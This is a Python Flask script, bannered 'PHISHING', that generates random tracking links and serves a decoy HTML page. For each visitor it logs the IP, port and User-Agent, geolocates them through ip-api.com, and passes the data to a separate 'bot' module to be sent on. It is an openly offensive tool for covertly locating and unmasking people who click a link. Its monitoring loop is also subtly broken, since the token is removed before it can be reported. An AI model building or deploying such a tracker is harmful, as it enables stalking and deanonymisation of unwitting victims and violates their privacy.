import socket
import threading
from flask import Flask, request, render_template_string
import requests
import json
import random
import string
import time

app = Flask(__name__)

BANNER = """
██████╗░██╗░░██╗██╗░██████╗██╗░░██╗██╗███╗░░██╗░██████╗░
██╔══██╗██║░░██║██║██╔════╝██║░░██║██║████╗░██║██╔════╝░
██████╔╝███████║██║╚█████╗░███████║██║██╔██╗██║██║░░██╗░
██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║██║██║╚████║██║░░╚██╗
██║░░░░░██║░░██║██║██████╔╝██║░░██║██║██║░╚███║╚██████╔╝
╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░
"""

tracking_data = {}
active_tokens = set()

def generate_url():
    chars = string.ascii_lowercase + string.digits
    token = ''.join(random.choice(chars) for _ in range(10))
    return f"http://localhost:5000/{token}"

def get_ip_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()
        return data
    except:
        return {}

def start_bot(info):
    import bot
    bot.send_info(info)

@app.route('/<token>')
def track_visit(token):
    if token not in active_tokens:
        return "Not Found", 404
    
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    ip_info = get_ip_info(ip)
    
    info = {
        'ip': ip,
        'port': request.environ.get('REMOTE_PORT'),
        'user_agent': user_agent,
        'country': ip_info.get('country', 'N/A'),
        'city': ip_info.get('city', 'N/A'),
        'lon': ip_info.get('lon', 'N/A'),
        'lat': ip_info.get('lat', 'N/A')
    }
    
    tracking_data[token] = info
    active_tokens.discard(token)
    
    with open('onion.html', 'r', encoding='utf-8') as f:
        html_content = f.read()
    
    return html_content

def start_flask():
    app.run(host='0.0.0.0', port=5000, debug=False)

def monitor_tracking():
    while True:
        for token in list(active_tokens):
            if tracking_data.get(token):
                info = tracking_data[token]
                print(f"""
Обнаружен переход по ссылке:

Информация о сети:
├IP - адрес: {info['ip']}
├User - Agent: {info['user_agent']}

Примерное местоположение:
├Страна: {info['country']}
├Город: {info['city']}
├Долгота: {info['lon']}
└Широта: {info['lat']}
""")
                start_bot(info)
                del tracking_data[token]
        
        time.sleep(1)

def generate_new_links():
    while True:
        if len(active_tokens) < 5:
            url = generate_url()
            token = url.split('/')[-1]
            active_tokens.add(token)
            tracking_data[token] = None
            print(f"🆕 Новая ссылка: {url}")
        time.sleep(30)

if __name__ == "__main__":
    print(BANNER)
    
    flask_thread = threading.Thread(target=start_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    monitor_thread = threading.Thread(target=monitor_tracking)
    monitor_thread.daemon = True
    monitor_thread.start()
    
    generator_thread = threading.Thread(target=generate_new_links)
    generator_thread.daemon = True
    generator_thread.start()
    
    print("🚀 Сервер запущен и работает 24/7")
    print("📊 Генерация ссылок активна")
    print("👁️  Отслеживание переходов запущено")
    print("⏹️  Для остановки нажмите Ctrl+C")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 Сервер остановлен")
